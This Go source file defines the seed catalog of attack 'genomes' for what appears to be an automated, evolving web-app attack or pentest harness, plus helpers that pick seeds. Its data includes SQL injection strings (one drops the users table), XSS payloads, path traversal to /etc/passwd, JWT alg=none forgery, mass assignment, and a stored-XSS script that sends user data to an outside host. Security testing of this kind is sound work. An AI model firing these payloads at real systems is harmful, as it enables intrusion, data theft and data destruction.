// Package attacks holds the Go-side genome catalog and mutation helper data
// (seed genomes, technique lists, target-path lists). These are data tables,
// not literal ports of the legacy Python attack scripts.
package attacks

// Genome is the attack-vector descriptor handed to each attacker pod via
// the GENOME env var. Field names mirror data_contracts.genome_schema in
// PRD.json.
type Genome struct {
	Vector         string         `json:"vector"`
	Category       string         `json:"category"`
	Technique      string         `json:"technique"`
	TargetPath     string         `json:"target_path"`
	Params         map[string]any `json:"params"`
	Hint           string         `json:"hint"`
	ParentPodID    string         `json:"parent_pod_id,omitempty"`
	RequiresNimble bool           `json:"requires_nimble,omitempty"`
}

// SeedGenomes is the Generation-1 starter population of generic OWASP
// Top 10 attack vectors. Order is significant: when --population is less
// than the full list the control plane uses the first N entries
// deterministically, which keeps demo runs reproducible.
var SeedGenomes = []Genome{
	{
		Vector: "sqli_login", Category: "injection", Technique: "tautology",
		TargetPath: "/api/login",
		Params:     map[string]any{"username_payload": "' OR 1=1--", "password": "x"},
		Hint:       "Try auth bypass via SQL tautology in login form.",
	},
	{
		Vector: "sqli_search", Category: "injection", Technique: "union_select",
		TargetPath: "/api/search",
		Params:     map[string]any{"q_payload": "' UNION SELECT 1,2,3--"},
		Hint:       "Try UNION-based info leak via search parameter.",
	},
	{
		Vector: "xss_search_reflected", Category: "xss", Technique: "reflected",
		TargetPath: "/search",
		Params:     map[string]any{"q": "<script>alert(1)</script>"},
		Hint:       "Try reflected XSS via search query parameter.",
	},
	{
		Vector: "bola_user_by_id", Category: "access_control", Technique: "id_enumeration",
		TargetPath: "/api/users/1",
		Params:     map[string]any{},
		Hint:       "Try fetching user record by ID without auth.",
	},
	{
		Vector: "bola_resource_enum", Category: "access_control", Technique: "id_enumeration",
		TargetPath: "/api/orders/1",
		Params:     map[string]any{},
		Hint:       "Try enumerating resources by sequential ID.",
	},
	{
		Vector: "jwt_alg_none", Category: "auth", Technique: "jwt_swap",
		TargetPath: "/api/me",
		Params:     map[string]any{"forge_alg": "none"},
		Hint:       "Forge a JWT with alg=none claiming admin privileges.",
	},
	{
		Vector: "path_traversal", Category: "data_exposure", Technique: "dotdot",
		TargetPath: "/api/files",
		Params:     map[string]any{"file": "../../../etc/passwd"},
		Hint:       "Try directory traversal to read sensitive files.",
	},
	{
		Vector: "data_exposure_env", Category: "data_exposure", Technique: "direct_get",
		TargetPath: "/.env",
		Params:     map[string]any{},
		Hint:       "Direct fetch of .env file for leaked secrets.",
	},
	{
		Vector: "data_exposure_robots", Category: "data_exposure", Technique: "direct_get",
		TargetPath: "/robots.txt",
		Params:     map[string]any{},
		Hint:       "Read robots.txt for disallowed paths.",
	},
	{
		Vector: "admin_panel", Category: "access_control", Technique: "force_browse",
		TargetPath:     "/admin",
		Params:         map[string]any{},
		Hint:           "Try to reach admin panel directly.",
		RequiresNimble: true,
	},
	{
		Vector: "stored_xss_comment", Category: "xss", Technique: "stored",
		TargetPath: "/api/comments",
		Params: map[string]any{
			"comment_payload": "<script>fetch('/api/users').then(r=>r.text()).then(t=>fetch('//x/?d='+btoa(t)))</script>",
		},
		Hint: "Try stored XSS in a user-submitted text field.",
	},
	{
		Vector: "mass_assign_role", Category: "auth", Technique: "param_pollution",
		TargetPath: "/api/register",
		Params: map[string]any{"body": map[string]any{
			"email": "z+<rand>@oz.dev", "password": "p", "role": "admin",
		}},
		Hint: "Mass-assign role=admin during registration.",
	},
	{
		Vector: "sqli_error_based", Category: "injection", Technique: "error_based",
		TargetPath: "/api/products",
		Params:     map[string]any{"q_payload": "' OR 1=1; DROP TABLE users--"},
		Hint:       "Try error-based SQL injection via search/filter parameter.",
	},
	{
		Vector: "captcha_bypass", Category: "validation", Technique: "skip_token",
		TargetPath: "/api/contact",
		Params:     map[string]any{"omit_captcha": true},
		Hint:       "Submit form without captcha token.",
	},
	{
		Vector: "hidden_routes", Category: "data_exposure", Technique: "force_browse",
		TargetPath:     "/api/debug",
		Params:         map[string]any{},
		Hint:           "Probe for hidden debug/admin routes.",
		RequiresNimble: true,
	},
}

// PickSeedGenomes returns the first n genomes from SeedGenomes, wrapping
// modulo when n exceeds the list length. This keeps small-population demo
// runs deterministic while still letting larger runs cover all vectors.
func PickSeedGenomes(n int) []Genome {
	if n <= 0 {
		return nil
	}
	out := make([]Genome, 0, n)
	for i := 0; i < n; i++ {
		out = append(out, SeedGenomes[i%len(SeedGenomes)])
	}
	return out
}

// PickSeedGenomesEnsuringNimble is the Nimble-aware variant. It first picks
// n deterministic seeds, then guarantees that at least one of them has
// RequiresNimble=true so the verification step ("at least one pod per
// generation invokes nimble_fetch when enabled") is honoured for small
// populations. If n=0 returns nil; if no requires-nimble seed exists in
// the catalog it falls back to PickSeedGenomes silently.
func PickSeedGenomesEnsuringNimble(n int) []Genome {
	picked := PickSeedGenomes(n)
	if len(picked) == 0 {
		return picked
	}
	for _, g := range picked {
		if g.RequiresNimble {
			return picked
		}
	}
	var nimbleSeed *Genome
	for i := range SeedGenomes {
		if SeedGenomes[i].RequiresNimble {
			nimbleSeed = &SeedGenomes[i]
			break
		}
	}
	if nimbleSeed == nil {
		return picked
	}
	picked[len(picked)-1] = *nimbleSeed
	return picked
}
